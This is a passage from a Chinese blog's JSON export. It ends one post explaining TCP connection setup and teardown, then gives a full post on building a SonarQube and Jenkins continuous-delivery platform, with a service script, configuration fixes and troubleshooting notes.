00;&#x4E2A;&#x590D;&#x6742;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x8FD9;&#x7BC7;&#x535A;&#x6587;&#x4E2D;&#x5E76;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x603B;&#x7ED3;&#x7684;&#xFF1B;</li>\n</ul>\n<hr>\n<h2 id=\"TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;\"><a href=\"#TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;\" class=\"headerlink\" title=\"TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;\"></a>TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;</h2><p>&#x5EFA;&#x7ACB;TCP&#x9700;&#x8981;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x624D;&#x80FD;&#x5EFA;&#x7ACB;&#xFF0C;&#x800C;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x5219;&#x9700;&#x8981;&#x56DB;&#x6B21;&#x63E1;&#x624B;&#x3002;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/4.jpg\" alt=\"\"></p>\n<p>&#x5148;&#x6765;&#x770B;&#x770B;&#x5982;&#x4F55;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x7684;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/5.jpg\" alt=\"\"></p>\n<ul>\n<li>&#x7B2C;&#x4E00;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x6BB5;&#xFF0C;&#x5C06;SYN&#x4F4D;&#x7F6E;&#x4E3A;1&#xFF0C;Sequence Number&#x4E3A;x&#xFF1B;&#x7136;&#x540E;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x5165;SYN_SEND&#x72B6;&#x6001;&#xFF0C;&#x7B49;&#x5F85;&#x670D;&#x52A1;&#x5668;&#x7684;&#x786E;&#x8BA4;&#xFF1B;</li>\n<li>&#x7B2C;&#x4E8C;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x670D;&#x52A1;&#x5668;&#x6536;&#x5230;SYN&#x62A5;&#x6587;&#x6BB5;&#x3002;&#x670D;&#x52A1;&#x5668;&#x6536;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;SYN&#x62A5;&#x6587;&#x6BB5;&#xFF0C;&#x9700;&#x8981;&#x5BF9;&#x8FD9;&#x4E2A;SYN&#x62A5;&#x6587;&#x6BB5;&#x8FDB;&#x884C;&#x786E;&#x8BA4;&#xFF0C;&#x8BBE;&#x7F6E;Acknowledgment Number&#x4E3A;x+1(Sequence Number+1)&#xFF1B;&#x540C;&#x65F6;&#xFF0C;&#x81EA;&#x5DF1;&#x81EA;&#x5DF1;&#x8FD8;&#x8981;&#x53D1;&#x9001;SYN&#x8BF7;&#x6C42;&#x4FE1;&#x606F;&#xFF0C;&#x5C06;SYN&#x4F4D;&#x7F6E;&#x4E3A;1&#xFF0C;Sequence Number&#x4E3A;y&#xFF1B;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5C06;&#x4E0A;&#x8FF0;&#x6240;&#x6709;&#x4FE1;&#x606F;&#x653E;&#x5230;&#x4E00;&#x4E2A;&#x62A5;&#x6587;&#x6BB5;&#xFF08;&#x5373;SYN+ACK&#x62A5;&#x6587;&#x6BB5;&#xFF09;&#x4E2D;&#xFF0C;&#x4E00;&#x5E76;&#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x6B64;&#x65F6;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x5165;SYN_RECV&#x72B6;&#x6001;&#xFF1B;</li>\n<li>&#x7B2C;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x6536;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7684;SYN+ACK&#x62A5;&#x6587;&#x6BB5;&#x3002;&#x7136;&#x540E;&#x5C06;Acknowledgment Number&#x8BBE;&#x7F6E;&#x4E3A;y+1&#xFF0C;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;ACK&#x62A5;&#x6587;&#x6BB5;&#xFF0C;&#x8FD9;&#x4E2A;&#x62A5;&#x6587;&#x6BB5;&#x53D1;&#x9001;&#x5B8C;&#x6BD5;&#x4EE5;&#x540E;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x90FD;&#x8FDB;&#x5165;ESTABLISHED&#x72B6;&#x6001;&#xFF0C;&#x5B8C;&#x6210;TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x3002;</li>\n</ul>\n<p><strong>&#x5176;&#x5B9E;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x5C31;&#x662F;&#xFF0C;A&#x544A;&#x8BC9;B&#x8981;&#x8FDE;&#x63A5;&#xFF0C;B&#x901A;&#x77E5;A&#x53EF;&#x4EE5;&#x8FDE;&#x63A5;&#x4E86;&#xFF0C;A&#x518D;&#x544A;&#x8BC9;B&#xFF0C;&#x90A3;&#x6211;&#x8FDE;&#x63A5;&#x4E86;&#x3002;</strong></p>\n<hr>\n<h2 id=\"TCP&#x56DB;&#x6B21;&#x6325;&#x624B;\"><a href=\"#TCP&#x56DB;&#x6B21;&#x6325;&#x624B;\" class=\"headerlink\" title=\"TCP&#x56DB;&#x6B21;&#x6325;&#x624B;\"></a>TCP&#x56DB;&#x6B21;&#x6325;&#x624B;</h2><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/6.jpg\" alt=\"\"><br>&#x5047;&#x8BBE;Client&#x7AEF;&#x53D1;&#x8D77;&#x4E2D;&#x65AD;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x53D1;&#x9001;FIN&#x62A5;&#x6587;&#x3002;Server&#x7AEF;&#x63A5;&#x5230;FIN&#x62A5;&#x6587;&#x540E;&#xFF0C;&#x610F;&#x601D;&#x662F;&#x8BF4;&#x201D;<strong>&#x6211;Client&#x7AEF;&#x6CA1;&#x6709;&#x6570;&#x636E;&#x8981;&#x53D1;&#x7ED9;&#x4F60;&#x4E86;</strong>&#x201C;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x4F60;&#x8FD8;&#x6709;&#x6570;&#x636E;&#x6CA1;&#x6709;&#x53D1;&#x9001;&#x5B8C;&#x6210;&#xFF0C;&#x5219;&#x4E0D;&#x5FC5;&#x6025;&#x7740;&#x5173;&#x95ED;Socket&#xFF0C;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x53D1;&#x9001;&#x6570;&#x636E;&#x3002;&#x6240;&#x4EE5;&#x4F60;&#x5148;&#x53D1;&#x9001;ACK&#xFF0C;&#x201D;<strong>&#x544A;&#x8BC9;Client&#x7AEF;&#xFF0C;&#x4F60;&#x7684;&#x8BF7;&#x6C42;&#x6211;&#x6536;&#x5230;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x8FD8;&#x6CA1;&#x51C6;&#x5907;&#x597D;&#xFF0C;&#x8BF7;&#x7EE7;&#x7EED;&#x4F60;&#x7B49;&#x6211;&#x7684;&#x6D88;&#x606F;</strong>&#x201C;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;Client&#x7AEF;&#x5C31;&#x8FDB;&#x5165;FIN_WAIT&#x72B6;&#x6001;&#xFF0C;&#x7EE7;&#x7EED;&#x7B49;&#x5F85;Server&#x7AEF;&#x7684;FIN&#x62A5;&#x6587;&#x3002;&#x5F53;Server&#x7AEF;&#x786E;&#x5B9A;&#x6570;&#x636E;&#x5DF2;&#x53D1;&#x9001;&#x5B8C;&#x6210;&#xFF0C;&#x5219;&#x5411;Client&#x7AEF;&#x53D1;&#x9001;FIN&#x62A5;&#x6587;&#xFF0C;&#x201D;<strong>&#x544A;&#x8BC9;Client&#x7AEF;&#xFF0C;&#x597D;&#x4E86;&#xFF0C;&#x6211;&#x8FD9;&#x8FB9;&#x6570;&#x636E;&#x53D1;&#x5B8C;&#x4E86;&#xFF0C;&#x51C6;&#x5907;&#x597D;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x4E86;</strong>&#x201C;&#x3002;Client&#x7AEF;&#x6536;&#x5230;FIN&#x62A5;&#x6587;&#x540E;&#xFF0C;&#x201D;<strong>&#x5C31;&#x77E5;&#x9053;&#x53EF;&#x4EE5;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x4ED6;&#x8FD8;&#x662F;&#x4E0D;&#x76F8;&#x4FE1;&#x7F51;&#x7EDC;&#xFF0C;&#x6015;Server&#x7AEF;&#x4E0D;&#x77E5;&#x9053;&#x8981;&#x5173;&#x95ED;&#xFF0C;&#x6240;&#x4EE5;&#x53D1;&#x9001;ACK&#x540E;&#x8FDB;&#x5165;TIME_WAIT&#x72B6;&#x6001;&#xFF0C;&#x5982;&#x679C;Server&#x7AEF;&#x6CA1;&#x6709;&#x6536;&#x5230;ACK&#x5219;&#x53EF;&#x4EE5;&#x91CD;&#x4F20;</strong>&#x3002;&#x201D;Server&#x7AEF;&#x6536;&#x5230;ACK&#x540E;&#xFF0C;&#x201D;<strong>&#x5C31;&#x77E5;&#x9053;&#x53EF;&#x4EE5;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x4E86;</strong>&#x201C;&#x3002;Client&#x7AEF;&#x7B49;&#x5F85;&#x4E86;2MSL&#x540E;&#x4F9D;&#x7136;&#x6CA1;&#x6709;&#x6536;&#x5230;&#x56DE;&#x590D;&#xFF0C;&#x5219;<strong>&#x8BC1;&#x660E;Server&#x7AEF;&#x5DF2;&#x6B63;&#x5E38;&#x5173;&#x95ED;&#xFF0C;&#x90A3;&#x597D;&#xFF0C;&#x6211;Client&#x7AEF;&#x4E5F;&#x53EF;&#x4EE5;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x4E86;</strong>&#x3002;Ok&#xFF0C;TCP&#x8FDE;&#x63A5;&#x5C31;&#x8FD9;&#x6837;&#x5173;&#x95ED;&#x4E86;&#xFF01;</p>\n<p>&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;Client&#x7AEF;&#x6240;&#x7ECF;&#x5386;&#x7684;&#x72B6;&#x6001;&#x5982;&#x4E0B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/7.jpg\" alt=\"\"></p>\n<p>&#x800C;Server&#x7AEF;&#x6240;&#x7ECF;&#x5386;&#x7684;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/8.jpg\" alt=\"\"></p>\n<hr>\n<h2 id=\"&#x76F8;&#x5173;&#x7591;&#x95EE;\"><a href=\"#&#x76F8;&#x5173;&#x7591;&#x95EE;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x7591;&#x95EE;\"></a>&#x76F8;&#x5173;&#x7591;&#x95EE;</h2><p><strong>&#x3010;&#x95EE;&#x9898;1&#x3011;&#x4E3A;&#x4EC0;&#x4E48;&#x8FDE;&#x63A5;&#x7684;&#x65F6;&#x5019;&#x662F;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF0C;&#x5173;&#x95ED;&#x7684;&#x65F6;&#x5019;&#x5374;&#x662F;&#x56DB;&#x6B21;&#x63E1;&#x624B;&#xFF1F;</strong><br>&#x7B54;&#xFF1A;&#x56E0;&#x4E3A;&#x5F53;Server&#x7AEF;&#x6536;&#x5230;Client&#x7AEF;&#x7684;SYN&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x53D1;&#x9001;SYN+ACK&#x62A5;&#x6587;&#x3002;&#x5176;&#x4E2D;ACK&#x62A5;&#x6587;&#x662F;&#x7528;&#x6765;&#x5E94;&#x7B54;&#x7684;&#xFF0C;SYN&#x62A5;&#x6587;&#x662F;&#x7528;&#x6765;&#x540C;&#x6B65;&#x7684;&#x3002;&#x4F46;&#x662F;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x65F6;&#xFF0C;&#x5F53;Server&#x7AEF;&#x6536;&#x5230;FIN&#x62A5;&#x6587;&#x65F6;&#xFF0C;&#x5F88;&#x53EF;&#x80FD;&#x5E76;&#x4E0D;&#x4F1A;&#x7ACB;&#x5373;&#x5173;&#x95ED;SOCKET&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x80FD;&#x5148;&#x56DE;&#x590D;&#x4E00;&#x4E2A;ACK&#x62A5;&#x6587;&#xFF0C;&#x544A;&#x8BC9;Client&#x7AEF;&#xFF0C;&#x201D;&#x4F60;&#x53D1;&#x7684;FIN&#x62A5;&#x6587;&#x6211;&#x6536;&#x5230;&#x4E86;&#x201D;&#x3002;&#x53EA;&#x6709;&#x7B49;&#x5230;&#x6211;Server&#x7AEF;&#x6240;&#x6709;&#x7684;&#x62A5;&#x6587;&#x90FD;&#x53D1;&#x9001;&#x5B8C;&#x4E86;&#xFF0C;&#x6211;&#x624D;&#x80FD;&#x53D1;&#x9001;FIN&#x62A5;&#x6587;&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x80FD;&#x4E00;&#x8D77;&#x53D1;&#x9001;&#x3002;&#x6545;&#x9700;&#x8981;&#x56DB;&#x6B65;&#x63E1;&#x624B;&#x3002;</p>\n<p><strong>&#x3010;&#x95EE;&#x9898;2&#x3011;&#x4E3A;&#x4EC0;&#x4E48;TIME_WAIT&#x72B6;&#x6001;&#x9700;&#x8981;&#x7ECF;&#x8FC7;2MSL(&#x6700;&#x5927;&#x62A5;&#x6587;&#x6BB5;&#x751F;&#x5B58;&#x65F6;&#x95F4;)&#x624D;&#x80FD;&#x8FD4;&#x56DE;&#x5230;CLOSE&#x72B6;&#x6001;&#xFF1F;</strong><br>&#x7B54;&#xFF1A;&#x867D;&#x7136;&#x6309;&#x9053;&#x7406;&#xFF0C;&#x56DB;&#x4E2A;&#x62A5;&#x6587;&#x90FD;&#x53D1;&#x9001;&#x5B8C;&#x6BD5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8FDB;&#x5165;CLOSE&#x72B6;&#x6001;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x5047;&#x8C61;&#x7F51;&#x7EDC;&#x662F;&#x4E0D;&#x53EF;&#x9760;&#x7684;&#xFF0C;&#x6709;&#x53EF;&#x4EE5;&#x6700;&#x540E;&#x4E00;&#x4E2A;ACK&#x4E22;&#x5931;&#x3002;&#x6240;&#x4EE5;TIME_WAIT&#x72B6;&#x6001;&#x5C31;&#x662F;&#x7528;&#x6765;&#x91CD;&#x53D1;&#x53EF;&#x80FD;&#x4E22;&#x5931;&#x7684;ACK&#x62A5;&#x6587;&#x3002;</p>\n<p><strong>&#x3010;&#x95EE;&#x9898;3&#x3011;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x80FD;&#x7528;&#x4E24;&#x6B21;&#x63E1;&#x624B;&#x8FDB;&#x884C;&#x8FDE;&#x63A5;&#xFF1F;</strong><br>&#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF0C;3&#x6B21;&#x63E1;&#x624B;&#x5B8C;&#x6210;&#x4E24;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x65E2;&#x8981;&#x53CC;&#x65B9;&#x505A;&#x597D;&#x53D1;&#x9001;&#x6570;&#x636E;&#x7684;&#x51C6;&#x5907;&#x5DE5;&#x4F5C;(&#x53CC;&#x65B9;&#x90FD;&#x77E5;&#x9053;&#x5F7C;&#x6B64;&#x5DF2;&#x51C6;&#x5907;&#x597D;)&#xFF0C;&#x4E5F;&#x8981;&#x5141;&#x8BB8;&#x53CC;&#x65B9;&#x5C31;&#x521D;&#x59CB;&#x5E8F;&#x5217;&#x53F7;&#x8FDB;&#x884C;&#x534F;&#x5546;&#xFF0C;&#x8FD9;&#x4E2A;&#x5E8F;&#x5217;&#x53F7;&#x5728;&#x63E1;&#x624B;&#x8FC7;&#x7A0B;&#x4E2D;&#x88AB;&#x53D1;&#x9001;&#x548C;&#x786E;&#x8BA4;&#x3002;<br>&#x73B0;&#x5728;&#x628A;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x6539;&#x6210;&#x4EC5;&#x9700;&#x8981;&#x4E24;&#x6B21;&#x63E1;&#x624B;&#xFF0C;&#x6B7B;&#x9501;&#x662F;&#x53EF;&#x80FD;&#x53D1;&#x751F;&#x7684;&#x3002;&#x4F5C;&#x4E3A;&#x4F8B;&#x5B50;&#xFF0C;&#x8003;&#x8651;&#x8BA1;&#x7B97;&#x673A;S&#x548C;C&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x5047;&#x5B9A;C&#x7ED9;S&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x5206;&#x7EC4;&#xFF0C;S&#x6536;&#x5230;&#x4E86;&#x8FD9;&#x4E2A;&#x5206;&#x7EC4;&#xFF0C;&#x5E76;&#x53D1;&#x9001;&#x4E86;&#x786E;&#x8BA4;&#x5E94;&#x7B54;&#x5206;&#x7EC4;&#x3002;&#x6309;&#x7167;&#x4E24;&#x6B21;&#x63E1;&#x624B;&#x7684;&#x534F;&#x5B9A;&#xFF0C;S&#x8BA4;&#x4E3A;&#x8FDE;&#x63A5;&#x5DF2;&#x7ECF;&#x6210;&#x529F;&#x5730;&#x5EFA;&#x7ACB;&#x4E86;&#xFF0C;&#x53EF;&#x4EE5;&#x5F00;&#x59CB;&#x53D1;&#x9001;&#x6570;&#x636E;&#x5206;&#x7EC4;&#x3002;&#x53EF;&#x662F;&#xFF0C;C&#x5728;S&#x7684;&#x5E94;&#x7B54;&#x5206;&#x7EC4;&#x5728;&#x4F20;&#x8F93;&#x4E2D;&#x88AB;&#x4E22;&#x5931;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5C06;&#x4E0D;&#x77E5;&#x9053;S&#x662F;&#x5426;&#x5DF2;&#x51C6;&#x5907;&#x597D;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;S&#x5EFA;&#x7ACB;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x5E8F;&#x5217;&#x53F7;&#xFF0C;C&#x751A;&#x81F3;&#x6000;&#x7591;S&#x662F;&#x5426;&#x6536;&#x5230;&#x81EA;&#x5DF1;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x5206;&#x7EC4;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;C&#x8BA4;&#x4E3A;&#x8FDE;&#x63A5;&#x8FD8;&#x672A;&#x5EFA;&#x7ACB;&#x6210;&#x529F;&#xFF0C;&#x5C06;&#x5FFD;&#x7565;S&#x53D1;&#x6765;&#x7684;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x5206; &#x7EC4;&#xFF0C;&#x53EA;&#x7B49;&#x5F85;&#x8FDE;&#x63A5;&#x786E;&#x8BA4;&#x5E94;&#x7B54;&#x5206;&#x7EC4;&#x3002;&#x800C;S&#x5728;&#x53D1;&#x51FA;&#x7684;&#x5206;&#x7EC4;&#x8D85;&#x65F6;&#x540E;&#xFF0C;&#x91CD;&#x590D;&#x53D1;&#x9001;&#x540C;&#x6837;&#x7684;&#x5206;&#x7EC4;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x5F62;&#x6210;&#x4E86;&#x6B7B;&#x9501;&#x3002;</p>"},{"title":"SonarQube+Jenkins,搭建持续交付平台","date":"2016-06-10T14:22:00.000Z","toc":false,"_content":"\n### 前言\nKurt Bittner曾说过，如果敏捷仅仅只是开始，那持续交付就是头条! \n*“If Agile Was the Opening Act, Continuous Delivery is the Headliner!”——Kurt Bittner*\n\n五月上旬我的一个主要工作就是搭建持续交付平台。\n打算以Jenkins为核心，每天定时从代码库中检出最新的代码进行编译、构建。构建结果通过自动发送的邮件通知到项目组，开发人员每天只需关心最新的集成结果是否正确即可。\n\n再搭建SonarQube代码质量检测工具，单位时间定时扫描代码库最新代码，检测出代码中的存在的阻断错误、严重错误、主要错误、次要错误和相关提示信息。通过SonarQube能有效简洁统一代码风格，利于大家更好的相互理解和后期排查。\n\n以下是搭建过程中用到的相关网站及碰到的坑。\n\n---\n\n### 相关网站\nSonar官方网站：[http://www.sonarqube.org/](http://www.sonarqube.org/)\nJenkins官方使用教程：[https://wiki.jenkins-ci.org/display/JENKINS/Use+Jenkins](https://wiki.jenkins-ci.org/display/JENKINS/Use+Jenkins)\nJenkins安装链接：[http://www.cnblogs.com/zhangqingsh/archive/2013/03/19/2968998.html](http://www.cnblogs.com/zhangqingsh/archive/2013/03/19/2968998.html)\nSonar安装链接：[http://flyingdutchman.iteye.com/blog/1905906](http://flyingdutchman.iteye.com/blog/1905906)\nSonar简介及安装地址：[http://www.ibm.com/developerworks/cn/opensource/os-sonarqube/](http://www.ibm.com/developerworks/cn/opensource/os-sonarqube/)\nJenkins使用集锦：[http://my.oschina.net/u/260244/blog/318755?fromerr=ZvUu6dmF](http://my.oschina.net/u/260244/blog/318755?fromerr=ZvUu6dmF)\nJenkins和Sonar整合地址1：[https://lasithapetthawadu.wordpress.com/2014/05/03/configure-jenkins-with-sonarqube-for-static-code-analysis-and-integration/](https://lasithapetthawadu.wordpress.com/2014/05/03/configure-jenkins-with-sonarqube-for-static-code-analysis-and-integration/)\nJenkins和Sonar整合地址2：[http://www.cnblogs.com/zhuhongbao/p/4197974.html](http://www.cnblogs.com/zhuhongbao/p/4197974.html)\n搭建过程中涉及到的 JDK、Tomcat、Mysql、Redis、Maven等系列安装链接省略  0.0！\n\n<!-- more -->\n\n---\n\n### sonar添加service服务\n```bash\n# 编写简单的sonar启动脚本\nvim /etc/init.d/sonar\n\n[sonar]\n#!/bin/sh  \nstart()  \n{  \n        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start\n}  \nstop()  \n{  \n        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh stop\n}\nstatus()  \n{       \n        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh status\n}\nrestart()  \n{  \n        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh restart\n} \nSONAR=\"/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh\"\n[ -f $SONAR ] || exit 1  \n# See how we were called.  \ncase \"$1\" in  \n        start)  \n                start  \n                ;;  \n        stop)  \n                stop  \n                ;;  \n        restart)  \n                restart\n                ;;  \n        status)  \n                status \n                ;;  \n                # stop    sleep 3   start  ;;  \n        *)  \n                echo $\"Usage: $0 {start|stop|status|restart}\"  \n                exit 1  \nesac  \nexit 0 \n\n\n# sonar服务验证\nservice sonar status\nservice sonar start\nservice sonar restart\nservice sonar stop\n\n```\n\n**问题：**<font style=\"color:red\">验证service服务时，发现四个命令唯独 service sonar start 命令失败，但是手动输入下面命令却可以启动成功【添加sonar自启动服务时也出现同样问题】。</font>\n```bash\n/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start\n```\n\n我们查看相关日志：\n```bash\n#tail -f /data/sonar/sonarqube-5.6.1/logs/sonar.log\n--> Wrapper Started as Daemon\nLaunching a JVM...\nUnable to start JVM: No such file or directory (2)\nJVM exited while loading the application.\nJVM Restarts disabled.  Shutting down.\n<-- Wrapper Stopped\n```\n\nlog提示不能加载JVM，接着查看sonar的wrapper.conf文件\n```bash\nvim /data/sonar/sonarqube-5.6.1/conf/wrapper.conf\n\n# Path to JVM executable. By default it must be available in PATH.\n# Can be an absolute path, for example:\n#wrapper.java.command=/path/to/my/jdk/bin/java\nwrapper.java.command=/java\n```\n\nwrapper.conf文件提示wrapper.java.command需要配置java路径，默认路径显然有误，修改后，再次运行【service sonar start】，操作成功。\n```bash\nwrapper.java.command=/usr/java/jdk1.8.0_31/bin/java\n```\n---\n\n### 系列问题\n**问题：通过命令直接安装Jenkins，连接被拒绝时**\n**方案：**手动下载包，下载地址：[http://mirrors.jenkins-ci.org/war/](http://mirrors.jenkins-ci.org/war/)\n\n**问题：Jenkins安装完成后启动报错**\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/1.png)\n**方案：**通过\"vi /etc/init.d/jenkins\"，把JDK的java路径加上即可\n**注意：**Jenkins启动后自动部署Tomcat，Tomcat需先启动\n<!--more-->\n\n**问题：Sonar无法启动，Failed to start SonarQube.**\n**方案：**切换成root用户启动试试，可能是没有权限。\n\n**问题：Sonar中文乱码问题**\n**方案：**sonar-run配置有问题，里面的jdbc配置是：\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/2.png)\n\n\n**问题：Sonar某个版本安装成功后，启动却总只显示一个页面，并提示Sonar正在维护中**\n**方案：**无需更换版本，仔细查看发现该提示页面可以直接点击进行相关插件的自动升级，重启后首页即可访问。\n\n**问题：Sonar成功启动后，却总是马上自动关闭服务**\n**方案：**很可能是没有启动mysql服务，启动即可。\n\n**问题：Sonar成功运行后，如何显示中文?**\n**方案：**在Settings/SYSTEM/Update Center/Available Plugins下安装汉化包，并重新启动Sonar。\n**注意：**当某些插件总是下载失败时，可以直接搜索插件名手动下载，并在【系统管理--管理插件--高级--浏览-上传插件】中上传插件即可。\n\n**问题：Jenkins集成Sonar后，Sonar无法扫描Java语言代码**\n**方案：**在Sonar的Settings/SYSTEM/Update Center/Available目录下下载Java语言包，并重新启动Jenkins和Sonar。Jenkins会根据配置的扫描路径，定时扫描相关代码，并在Sonar中可视化。\n**注意：**SonarQube集成Java插件官方地址：[http://docs.sonarqube.org/display/PLUG/Java+Plugin](http://docs.sonarqube.org/display/PLUG/Java+Plugin)\n\n**问题：下载某语言包后，Sonar重启仍然无法扫描相关代码**\n**原因：**如下载\"C/C++/Objective-c\"这个插件后，重新启动扫描C代码总是报错：\n```bash\nCaused by: org.sonar.api.utils.SonarException: No license for cpp\n```\n原以为是需要安装cpp插件，后来才发现重点是No license，意思就是需要付费购买许可证。\n网上搜索免费许可证无果，然后点击\"Get trial key\", 结果立马收到官方邮件回复被拒，终放弃。\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/3.png)\n\n**问题：Jenkins集成Sonar后，Jenkins自动化脚本执行失败，并报如下错误**\n**方案：**更换插件版本即可，下次安装需要注意。\n\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/4.png)\n\n**问题：Jenkins账户权限如何分配**\n**方案：** 相关链接：[http://www.360doc.com/content/13/0802/14/7811581_304255550.shtml](http://www.360doc.com/content/13/0802/14/7811581_304255550.shtml)\n**注意：** 如果用admin账户登录，在分配权限的时候，将admin权限全部置空，一旦退出，将无法使用 0.0！我当初的解决方法是修改远程配置文件，而如果配置文件一旦改乱，就只能重装了。\n\n### 运行结果\n**Sonar成功运行如图五图六所示，其中代码检测规则可以修改也可以自定义，对于图六显示出的具体错误，Sonar也可在页面直接分配给某个组员修改**\n\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/5.png)\n![图片6](http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/6.png)\n\n<br/>","source":"_posts/SonarQube+Jenkins,搭建持续交付平台.md","raw":"---\ntitle: 